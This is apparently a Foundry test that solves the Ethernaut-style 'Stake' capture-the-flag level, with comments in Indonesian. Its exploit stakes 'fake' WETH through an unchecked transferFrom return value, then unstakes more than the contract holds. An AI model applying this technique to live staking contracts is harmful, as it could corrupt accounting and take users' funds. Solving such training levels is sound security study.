// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Stake} from "src/levels/Stake.sol";
import {StakeFactory} from "src/levels/StakeFactory.sol";
import {IERC20} from "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract StakeSolve is Test {
    StakeFactory factory;
    Stake instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new StakeFactory();
        vm.deal(player, 10 ether);
        vm.deal(address(this), 10 ether);
        instance = Stake(factory.createInstance(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        address dweth = instance.WETH();

        // 1. Player stake ETH nyata 0.002 ether.
        vm.prank(player);
        instance.StakeETH{value: 0.002 ether}();

        // 2. Staker lain (kontrak test ini) stake WETH PALSU 1 ether:
        //    transferFrom WETH revert diam-diam (saldo DWETH 0) tapi
        //    return value-nya TIDAK dicek -> totalStaked naik tanpa dana.
        IERC20(dweth).approve(address(instance), 1 ether);
        instance.StakeWETH(1 ether);

        // 3. Player stake WETH palsu 0.002 ether, supaya total unstake
        //    (0.004) melebihi balance (0.002) -> send gagal, state tetap
        //    berubah (UserStake player -> 0, totalStaked tinggal 1 ether
        //    dari staker lain).
        vm.startPrank(player);
        IERC20(dweth).approve(address(instance), 0.002 ether);
        instance.StakeWETH(0.002 ether);
        instance.Unstake(0.004 ether);
        vm.stopPrank();

        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
